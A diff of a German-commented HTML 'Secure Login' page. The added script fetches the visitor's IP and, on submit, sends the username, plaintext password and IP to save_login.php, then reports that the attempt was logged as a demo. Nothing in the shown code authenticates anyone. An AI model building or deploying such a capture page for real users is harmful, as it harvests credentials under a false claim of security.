@@ -10,85 +10,49 @@
     <style>
         /* == Ladesymbol (Loader) == */
         #loader-wrapper {
-            position: fixed; /* Bleibt an Ort und Stelle, auch beim Scrollen */
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #111; /* Dunkler Hintergrund, passend zum Design */
-            z-index: 9999; /* Stellt sicher, dass es über allem liegt */
-            display: flex; /* Zentriert den Spinner */
-            justify-content: center;
-            align-items: center;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #111;
+            z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
         }
-
         .loader {
-            border: 8px solid #f3f3f3; /* Heller Kreis */
-            border-top: 8px solid #3498db; /* Blaue Farbe für die Drehung */
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1.5s linear infinite; /* Animations-Setup */
+            width: 60px; height: 60px;
+            animation: spin 1.5s linear infinite;
         }
-
-        /* Die Dreh-Animation */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* == Login-Formular == */
+        /* == Login-Formular Styles (wie gehabt) == */
         .login-container {
             max-width: 400px;
-            margin: 5rem auto; /* Zentriert die Box mit Abstand nach oben */
+            margin: 5rem auto;
             padding: 2rem;
             border: 1px solid #444;
             border-radius: 8px;
-            background-color: rgba(20, 20, 30, 0.5); /* Leicht transparenter Hintergrund */
+            background-color: rgba(20, 20, 30, 0.5);
         }
-
-        .login-container h2 {
-            text-align: center;
-            margin-bottom: 1.5rem;
+        .login-container h2 { text-align: center; margin-bottom: 1.5rem; }
+        .login-container form div { margin-bottom: 1rem; }
+        .login-container label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #ccc; }
+        .login-container input[type="text"], .login-container input[type="password"] {
+            width: 100%; padding: 0.75rem; background-color: #222;
+            border: 1px solid #555; border-radius: 4px; color: #fff; box-sizing: border-box;
         }
-
-        .login-container form div {
-            margin-bottom: 1rem;
-        }
-
-        .login-container label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
-            color: #ccc;
-        }
-
-        /* Wir stylen die Inputs, damit sie zum Rest passen */
-        .login-container input[type="text"],
-        .login-container input[type="password"] {
-            width: 100%;
-            padding: 0.75rem;
-            background-color: #222;
-            border: 1px solid #555;
-            border-radius: 4px;
-            color: #fff;
-            box-sizing: border-box; /* Stellt sicher, dass padding die Breite nicht sprengt */
-        }
-
-        /* Den Button auf volle Breite strecken */
         .login-container .btn-outline {
-            width: 100%;
-            padding: 0.75rem;
-            margin-top: 1rem;
+            width: 100%; padding: 0.75rem; margin-top: 1rem; cursor: pointer;
+            background: transparent; border: 1px solid #3498db; color: #3498db;
         }
-
-        /* Für die IP-Info */
+        .login-container .btn-outline:hover {
+            background: #3498db; color: #fff;
+        }
         #ip-info {
-            text-align: center;
-            margin-top: 1.5rem;
-            font-size: 0.8rem;
-            color: #888;
-            font-family: monospace; /* Passt gut zu einer IP-Adresse */
+            text-align: center; margin-top: 1.5rem; font-size: 0.8rem; color: #888; font-family: monospace;
         }
     </style>
 </head>
@@ -115,7 +79,8 @@
         </div>
     </header>
 
-    <main class="main-index"> <div class="login-container">
+    <main class="main-index"> 
+        <div class="login-container">
             <h2>Secure Login</h2>
             <form id="login-form">
                 <div>
@@ -141,39 +106,66 @@
     </footer>
 
     <script>
-        // Diese Funktion wird ausgeführt, sobald die HTML-Struktur geladen ist
         document.addEventListener('DOMContentLoaded', function() {
             
-            // Finde die HTML-Elemente
             const loader = document.getElementById('loader-wrapper');
             const ipInfoElement = document.getElementById('ip-info');
+            const loginForm = document.getElementById('login-form');
+            
+            let currentIp = 'Unbekannt'; // Variable zum Speichern der IP
 
-            // Starte den IP-Check
-            // Wir nutzen einen kostenlosen Dienst (api.ipify.org), um die IP abzufragen
+            // 1. IP abrufen (wie in deinem Originalcode)
             fetch('https://api.ipify.org?format=json')
                 .then(response => {
-                    // Prüfe, ob die Antwort erfolgreich war
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.json(); // Wandle die Antwort in ein JSON-Objekt um
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.json();
                 })
                 .then(data => {
-                    // Erfolg! Zeige die IP-Adresse an.
+                    currentIp = data.ip;
                     ipInfoElement.textContent = 'Your IP: ' + data.ip;
                 })
                 .catch(error => {
-                    // Fehler! Zeige eine Fehlermeldung an.
                     console.error('Error fetching IP:', error);
                     ipInfoElement.textContent = 'Could not verify connection.';
                 })
                 .finally(() => {
-                    // EGAL ob Erfolg oder Fehler:
-                    // Blende das Ladesymbol aus.
                     loader.style.display = 'none';
                 });
+
+            // 2. Formular absenden abfangen
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault(); // Verhindert das normale Neuladen der Seite
+
+                // Daten aus den Feldern holen
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Das Datenpaket schnüren (Dictionary/JSON Objekt)
+                const loginData = {
+                    ip: currentIp,
+                    username: username,
+                    password: password
+                };
+
+                // Daten an dein PHP-Skript senden
+                fetch('save_login.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(loginData)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Erfolg:', result);
+                    alert("Login Versuch protokolliert! (Dies ist nur eine Demo)");
+                    // Hier könntest du weiterleiten: window.location.href = "dashboard.html";
+                })
+                .catch(error => {
+                    console.error('Fehler:', error);
+                });
+            });
         });
     </script>
-
 </body>
 </html>
